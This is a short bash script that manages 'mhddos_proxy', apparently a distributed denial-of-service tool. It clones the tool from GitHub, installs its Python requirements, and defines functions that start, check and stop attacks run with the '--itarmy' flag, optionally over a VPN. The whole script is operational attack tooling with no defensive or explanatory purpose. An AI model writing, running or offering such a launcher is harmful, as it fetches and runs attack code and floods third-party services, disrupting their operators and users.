#!/bin/bash


#checking for installation
#виконавча програма
EXEDir=mhddos_proxy
EXE=mhddos


############### functions ##################################

function statusAttackCommand {

    pgrep -f "$EXE" > /dev/null; echo $(($?==0));

}

function startAttackProxyCommand {

    cd $EXEDir

    python3 runner.py --itarmy "${EXE}"

    cd ..

}
 
function startAttackCommand {

    cd $EXEDir

    python3 runner.py --itarmy --vpn "${EXE}"

    cd ..

}

function stopAttackCommand {

    pgrep -f "$EXE" | xargs pkill -TERM -P; sleep 2s; \

}


############################################################


############### init #######################################

function initEXECommand {

    if $forceExeReinstall ; then

        echo "Forcing exe reinstall -> will delete the folder $EXEDir"
        rm -r "$EXEDir"

    fi

    #download and install the EXE if not available
    if [ -d "$EXEDir" ]
    then

        echo "$EXEDir already exists -> nothing to do."

    else

        echo "Exe dir does not exist -> will create one by checking out from GIT..."

        git clone https://github.com/porthole-ascend-cinnamon/$EXEDir

        cd $EXEDir;

        python3 -m pip install -r requirements.txt

        cd ..;

        sleep 2s;

    fi

}

############################################################

